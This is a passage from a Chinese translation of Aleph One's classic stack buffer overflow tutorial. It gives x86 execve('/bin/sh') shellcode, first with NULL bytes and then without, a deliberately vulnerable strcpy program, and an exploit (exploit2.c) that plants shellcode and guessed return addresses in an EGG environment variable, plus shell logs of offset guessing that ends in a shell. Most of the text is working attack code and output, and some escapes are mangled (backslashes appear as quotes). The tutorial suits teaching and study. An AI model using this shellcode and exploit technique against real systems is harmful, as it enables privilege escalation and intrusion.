&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;leal&nbsp; &nbsp;0x8(%esi),%ecx&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 3 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;leal&nbsp; &nbsp;0xc(%esi),%edx&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 3 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;int&nbsp; &nbsp; $0x80&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 2 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0x1, %eax&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# 5 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0x0, %ebx&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# 5 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;int&nbsp; &nbsp; $0x80&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 2 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;call&nbsp; &nbsp;-0x2b&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 5 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;.string ""/bin/sh""&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; # 8 bytes

------------------------------------------------------------------------------

&nbsp; &nbsp; 

&nbsp; &nbsp; 这看起来很不错了. 为了确保代码能够正常工作必须编译并执行. 但是还有一个问题.

我们的代码修改了自身, 可是多数操作系统将代码页标记为只读. 为了绕过这个限制我们

必须把要执行的代码放到堆栈或数据段中, 并且把控制转到那里. 为此应该把代码放到数

据段中的全局数组中. 我们首先需要用16进制表示的二进制代码. 先编译, 然后再用gdb

来取得二进制代码.

shellcodeasm.c

------------------------------------------------------------------------------

void main() {

__asm__("

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;jmp&nbsp; &nbsp; 0x2a&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# 3 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;popl&nbsp; &nbsp;%esi&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# 1 byte

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%esi,0x8(%esi)&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 3 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movb&nbsp; &nbsp;$0x0,0x7(%esi)&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 4 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0x0,0xc(%esi)&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 7 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0xb,%eax&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; # 5 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%esi,%ebx&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; # 2 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;leal&nbsp; &nbsp;0x8(%esi),%ecx&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 3 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;leal&nbsp; &nbsp;0xc(%esi),%edx&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 3 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;int&nbsp; &nbsp; $0x80&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 2 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0x1, %eax&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# 5 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0x0, %ebx&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# 5 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;int&nbsp; &nbsp; $0x80&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 2 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;call&nbsp; &nbsp;-0x2f&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 5 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;.string ""/bin/sh""&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; # 8 bytes

");

}

------------------------------------------------------------------------------

------------------------------------------------------------------------------
  
[aleph1]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c
  
[aleph1]$ gdb shellcodeasm

GDB is free software and you are welcome to distribute copies of it

under certain conditions; type "show copying" to see the conditions.

There is absolutely no warranty for GDB; type "show warranty" for details.

GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...

(gdb) disassemble main

Dump of assembler code for function main:

0x8000130 &lt;main&gt;:&nbsp; &nbsp;&nbsp; &nbsp; pushl&nbsp;&nbsp;%ebp

0x8000131 &lt;main+1&gt;:&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%esp,%ebp

0x8000133 &lt;main+3&gt;:&nbsp; &nbsp;&nbsp;&nbsp;jmp&nbsp; &nbsp; 0x800015f &lt;main+47&gt;

0x8000135 &lt;main+5&gt;:&nbsp; &nbsp;&nbsp;&nbsp;popl&nbsp; &nbsp;%esi

0x8000136 &lt;main+6&gt;:&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%esi,0x8(%esi)

0x8000139 &lt;main+9&gt;:&nbsp; &nbsp;&nbsp;&nbsp;movb&nbsp; &nbsp;$0x0,0x7(%esi)

0x800013d &lt;main+13&gt;:&nbsp; &nbsp; movl&nbsp; &nbsp;$0x0,0xc(%esi)

0x8000144 &lt;main+20&gt;:&nbsp; &nbsp; movl&nbsp; &nbsp;$0xb,%eax

0x8000149 &lt;main+25&gt;:&nbsp; &nbsp; movl&nbsp; &nbsp;%esi,%ebx

0x800014b &lt;main+27&gt;:&nbsp; &nbsp; leal&nbsp; &nbsp;0x8(%esi),%ecx

0x800014e &lt;main+30&gt;:&nbsp; &nbsp; leal&nbsp; &nbsp;0xc(%esi),%edx

0x8000151 &lt;main+33&gt;:&nbsp; &nbsp; int&nbsp; &nbsp; $0x80

0x8000153 &lt;main+35&gt;:&nbsp; &nbsp; movl&nbsp; &nbsp;$0x1,%eax

0x8000158 &lt;main+40&gt;:&nbsp; &nbsp; movl&nbsp; &nbsp;$0x0,%ebx

0x800015d &lt;main+45&gt;:&nbsp; &nbsp; int&nbsp; &nbsp; $0x80

0x800015f &lt;main+47&gt;:&nbsp; &nbsp; call&nbsp; &nbsp;0x8000135 &lt;main+5&gt;

0x8000164 &lt;main+52&gt;:&nbsp; &nbsp; das

0x8000165 &lt;main+53&gt;:&nbsp; &nbsp; boundl 0x6e(%ecx),%ebp

0x8000168 &lt;main+56&gt;:&nbsp; &nbsp; das

0x8000169 &lt;main+57&gt;:&nbsp; &nbsp; jae&nbsp; &nbsp; 0x80001d3 &lt;__new_exitfn+55&gt;

0x800016b &lt;main+59&gt;:&nbsp; &nbsp; addb&nbsp; &nbsp;%cl,0x55c35dec(%ecx)

End of assembler dump.

(gdb) x/bx main+3

0x8000133 &lt;main+3&gt;:&nbsp; &nbsp;&nbsp;&nbsp;0xeb

(gdb)

0x8000134 &lt;main+4&gt;:&nbsp; &nbsp;&nbsp;&nbsp;0x2a

(gdb)

.

.

.

------------------------------------------------------------------------------

testsc.c

------------------------------------------------------------------------------

char shellcode[] =

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;""xeb"x2a"x5e"x89"x76"x08"xc6"x46"x07"x00"xc7"x46"x0c"x00"x00"x00"

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;""x00"xb8"x0b"x00"x00"x00"x89"xf3"x8d"x4e"x08"x8d"x56"x0c"xcd"x80"

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;""xb8"x01"x00"x00"x00"xbb"x00"x00"x00"x00"xcd"x80"xe8"xd1"xff"xff"

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;""xff"x2f"x62"x69"x6e"x2f"x73"x68"x00"x89"xec"x5d"xc3";

void main() {

&nbsp; &nbsp;int *ret;

&nbsp; &nbsp;ret = (int *)&amp;ret + 2;

&nbsp; &nbsp;(*ret) = (int)shellcode;

}

------------------------------------------------------------------------------

------------------------------------------------------------------------------
  
[aleph1]$ gcc -o testsc testsc.c
  
[aleph1]$ ./testsc

$ exit
  
[aleph1]$

------------------------------------------------------------------------------

&nbsp; &nbsp; 成了! 但是这里还有一个障碍, 在多数情况下, 我们都是试图使一个字符缓冲区溢出.

那么在我们shellcode中的任何NULL字节都会被认为是字符串的结尾, 复制工作就到此为

止了. 对于我们的破解工作来说, 在shellcode里不能有NULL字节. 下面来消除这些字节,

同时把代码精简一点.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;Problem instruction:&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;Substitute with:

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;--------------------------------------------------------

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movb&nbsp; &nbsp;$0x0,0x7(%esi)&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; xorl&nbsp; &nbsp;%eax,%eax

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;molv&nbsp; &nbsp;$0x0,0xc(%esi)&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; movb&nbsp; &nbsp;%eax,0x7(%esi)

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;movl&nbsp; &nbsp;%eax,0xc(%esi)

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;--------------------------------------------------------

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0xb,%eax&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;movb&nbsp; &nbsp;$0xb,%al

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;--------------------------------------------------------

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0x1, %eax&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;xorl&nbsp; &nbsp;%ebx,%ebx

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0x0, %ebx&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%ebx,%eax

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;inc&nbsp; &nbsp; %eax

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;--------------------------------------------------------

&nbsp; &nbsp;Our improved code:

shellcodeasm2.c

------------------------------------------------------------------------------

void main() {

__asm__("

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;jmp&nbsp; &nbsp; 0x1f&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# 2 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;popl&nbsp; &nbsp;%esi&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# 1 byte

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%esi,0x8(%esi)&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 3 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;xorl&nbsp; &nbsp;%eax,%eax&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; # 2 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movb&nbsp; &nbsp;%eax,0x7(%esi)&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 3 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%eax,0xc(%esi)&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 3 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movb&nbsp; &nbsp;$0xb,%al&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 2 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%esi,%ebx&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; # 2 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;leal&nbsp; &nbsp;0x8(%esi),%ecx&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 3 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;leal&nbsp; &nbsp;0xc(%esi),%edx&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 3 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;int&nbsp; &nbsp; $0x80&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 2 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;xorl&nbsp; &nbsp;%ebx,%ebx&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; # 2 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%ebx,%eax&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; # 2 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;inc&nbsp; &nbsp; %eax&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# 1 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;int&nbsp; &nbsp; $0x80&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 2 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;call&nbsp; &nbsp;-0x24&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 5 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;.string ""/bin/sh""&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; # 8 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; # 46 bytes total

");

}

------------------------------------------------------------------------------

&nbsp; &nbsp;And our new test program:

testsc2.c

------------------------------------------------------------------------------

char shellcode[] =

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;""xeb"x1f"x5e"x89"x76"x08"x31"xc0"x88"x46"x07"x89"x46"x0c"xb0"x0b"

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;""x89"xf3"x8d"x4e"x08"x8d"x56"x0c"xcd"x80"x31"xdb"x89"xd8"x40"xcd"

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;""x80"xe8"xdc"xff"xff"xff/bin/sh";

void main() {

&nbsp; &nbsp;int *ret;

&nbsp; &nbsp;ret = (int *)&amp;ret + 2;

&nbsp; &nbsp;(*ret) = (int)shellcode;

}

------------------------------------------------------------------------------

------------------------------------------------------------------------------
  
[aleph1]$ gcc -o testsc2 testsc2.c
  
[aleph1]$ ./testsc2

$ exit
  
[aleph1]$

------------------------------------------------------------------------------

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;破解实战&nbsp;&nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; ~~~~~~~~~~

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; 

&nbsp; &nbsp; 现在把手头的工具都准备好. 我们已经有了shellcode. 我们知道shellcode必须是被

溢出的字符串的一部分. 我们知道必须把返回地址指回缓冲区. 下面的例子说明了这几点:

overflow1.c

------------------------------------------------------------------------------

char shellcode[] =

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;""xeb"x1f"x5e"x89"x76"x08"x31"xc0"x88"x46"x07"x89"x46"x0c"xb0"x0b"

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;""x89"xf3"x8d"x4e"x08"x8d"x56"x0c"xcd"x80"x31"xdb"x89"xd8"x40"xcd"

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;""x80"xe8"xdc"xff"xff"xff/bin/sh";

char large_string[128];

void main() {

&nbsp;&nbsp;char buffer[96];

&nbsp;&nbsp;int i;

&nbsp;&nbsp;long *long_ptr = (long *) large_string;

&nbsp;&nbsp;for (i = 0; i &lt; 32; i++)

&nbsp; &nbsp; *(long_ptr + i) = (int) buffer;

&nbsp;&nbsp;for (i = 0; i &lt; strlen(shellcode); i++)

&nbsp; &nbsp; large_string[i] = shellcode[i];

&nbsp;&nbsp;strcpy(buffer,large_string);

}

------------------------------------------------------------------------------

------------------------------------------------------------------------------
  
[aleph1]$ gcc -o exploit1 exploit1.c
  
[aleph1]$ ./exploit1

$ exit

exit
  
[aleph1]$

------------------------------------------------------------------------------

&nbsp; &nbsp; 如上所示, 我们用buffer[]的地址来填充large_string[]数组, shellcode就将会在

buffer[]之中. 然后我们把shellcode复制到large_string字串的开头. strcpy()不做任

何边界检查就会将large_string复制到buffer中去, 并且覆盖返回地址. 现在的返回地址

就是我们shellcode的起始位置. 一旦执行到main函数的尾部, 在试图返回时就会跳到我

们的shellcode中, 得到一个shell.

&nbsp; &nbsp; 我们所面临的问题是: 当试图使另外一个程序的缓冲区溢出的时候, 如何确定这个

缓冲区(会有我们的shellcode)的地址在哪? 答案是: 对于每一个程序, 堆栈的起始地址

都是相同的. 大多数程序不会一次向堆栈中压入成百上千字节的数据. 因此知道了堆栈

的开始地址, 我们可以试着猜出这个要使其溢出的缓冲区在哪. 下面的小程序会打印出

它的堆栈指针: 

sp.c

------------------------------------------------------------------------------

unsigned long get_sp(void) {

&nbsp; &nbsp;__asm__("movl %esp,%eax");

}

void main() {

&nbsp;&nbsp;printf("0x%x"n", get_sp());

}

------------------------------------------------------------------------------

------------------------------------------------------------------------------
  
[aleph1]$ ./sp

0x8000470
  
[aleph1]$

------------------------------------------------------------------------------

&nbsp; &nbsp; 假定我们要使其溢出的程序如下:

&nbsp; &nbsp; 

vulnerable.c

------------------------------------------------------------------------------

void main(int argc, char *argv[]) {

&nbsp;&nbsp;char buffer[512];

&nbsp;&nbsp;if (argc &gt; 1)

&nbsp; &nbsp; strcpy(buffer,argv[1]);

}

------------------------------------------------------------------------------

&nbsp; &nbsp; 我们创建一个程序可以接受两个参数, 一是缓冲区大小, 二是从其自身堆栈指针算起

的偏移量(这个堆栈指针指明了我们想要使其溢出的缓冲区所在的位置). 我们把溢出字符

串放到一个环境变量中, 这样就容易操作一些. 

exploit2.c

------------------------------------------------------------------------------

#include &lt;stdlib.h&gt;

#define DEFAULT_OFFSET&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;0

#define DEFAULT_BUFFER_SIZE&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; 512

char shellcode[] =

&nbsp;&nbsp;""xeb"x1f"x5e"x89"x76"x08"x31"xc0"x88"x46"x07"x89"x46"x0c"xb0"x0b"

&nbsp;&nbsp;""x89"xf3"x8d"x4e"x08"x8d"x56"x0c"xcd"x80"x31"xdb"x89"xd8"x40"xcd"

&nbsp;&nbsp;""x80"xe8"xdc"xff"xff"xff/bin/sh";

unsigned long get_sp(void) {

&nbsp; &nbsp;__asm__("movl %esp,%eax");

}

void main(int argc, char *argv[]) {

&nbsp;&nbsp;char *buff, *ptr;

&nbsp;&nbsp;long *addr_ptr, addr;

&nbsp;&nbsp;int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;

&nbsp;&nbsp;int i;

&nbsp;&nbsp;if (argc &gt; 1) bsize&nbsp;&nbsp;= atoi(argv[1]);

&nbsp;&nbsp;if (argc &gt; 2) offset = atoi(argv[2]);

&nbsp;&nbsp;if (!(buff = malloc(bsize))) {

&nbsp; &nbsp; printf("Can't allocate memory."n");

&nbsp; &nbsp; exit(0);

&nbsp;&nbsp;}

&nbsp;&nbsp;addr = get_sp() - offset;

&nbsp;&nbsp;printf("Using address: 0x%x"n", addr);

&nbsp;&nbsp;ptr = buff;

&nbsp;&nbsp;addr_ptr = (long *) ptr;

&nbsp;&nbsp;for (i = 0; i &lt; bsize; i+=4)

&nbsp; &nbsp; *(addr_ptr++) = addr;

&nbsp;&nbsp;ptr += 4;

&nbsp;&nbsp;for (i = 0; i &lt; strlen(shellcode); i++)

&nbsp; &nbsp; *(ptr++) = shellcode[i];

&nbsp;&nbsp;buff[bsize - 1] = '"0';

&nbsp;&nbsp;memcpy(buff,"EGG=",4);

&nbsp;&nbsp;putenv(buff);

&nbsp;&nbsp;system("/bin/bash");

}

------------------------------------------------------------------------------

&nbsp; &nbsp; 现在我们尝试猜测缓冲区的大小和偏移量:

------------------------------------------------------------------------------
  
[aleph1]$ ./exploit2 500

Using address: 0xbffffdb4
  
[aleph1]$ ./vulnerable $EGG
  
[aleph1]$ exit
  
[aleph1]$ ./exploit2 600

Using address: 0xbffffdb4
  
[aleph1]$ ./vulnerable $EGG

Illegal instruction
  
[aleph1]$ exit
  
[aleph1]$ ./exploit2 600 100

Using address: 0xbffffd4c
  
[aleph1]$ ./vulnerable $EGG

Segmentation fault
  
[aleph1]$ exit
  
[aleph1]$ ./exploit2 600 200

Using address: 0xbffffce8
  
[aleph1]$ ./vulnerable $EGG

Segmentation fault
  
[aleph1]$ exit

.

.

.
  
[aleph1]$ ./exploit2 600 1564

Using address: 0xbffff794
  
[aleph1]$ ./vulnerable $EGG

$

------------------------------------------------------------------------------

&nbsp; &nbsp; 

&nbsp; &nbsp; 正如我们所看到的, 这并不是一个很有效率的过程. 即使知道了堆栈的起始地址, 尝

试猜测偏移量也几乎是不可能的. 我们很可能要试验几百次, 没准几千次也说不定. 问题

的关键在于我们必须*确切*地知道我们代码开始的地址. 如果偏差哪怕只有一个字节我们

也只能得到段错误或非法指令错误. 提高成功率的一种方法是在我们溢出缓冲区的前段填

充NOP指令. 几乎所有的处理器都有NOP指令执行空操作. 常用于延时目的. 我们利用它来

填充溢出缓冲区的前半段. 然后把shellcode放到中段, 之后是返回地址. 如果我们足够

幸运的话, 返回地址指到NOPs字串的任何位置, NOP指令就会执行, 直到碰到我们的

shellcode. 在Intel体系结构中NOP指令只有一个字节长, 翻译为机器码是0x90. 假定堆栈

的起始地址是0xFF, S代表shellcode, N代表NOP指令, 新的堆栈看起来是这样:

内存低&nbsp; &nbsp;&nbsp;&nbsp;DDDDDDDDEEEEEEEEEEEE&nbsp;&nbsp;EEEE&nbsp;&nbsp;FFFF&nbsp;&nbsp;FFFF&nbsp;&nbsp;FFFF&nbsp;&nbsp;FFFF&nbsp; &nbsp;&nbsp;&nbsp;内存高

地址&nbsp; &nbsp;&nbsp; &nbsp; 89ABCDEF0123456789AB&nbsp;&nbsp;CDEF&nbsp;&nbsp;0123&nbsp;&nbsp;4567&nbsp;&nbsp;89AB&nbsp;&nbsp;CDEF&nbsp; &nbsp;&nbsp;&nbsp;地址

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;buffer&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; sfp&nbsp; &nbsp;ret&nbsp; &nbsp;a&nbsp; &nbsp;&nbsp;&nbsp;b&nbsp; &nbsp;&nbsp;&nbsp;c

&lt;------&nbsp; &nbsp;[NNNNNNNNNNNSSSSSSSSS][0xDE][0xDE][0xDE][0xDE][0xDE]

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;^&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;|

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;|_____________________|

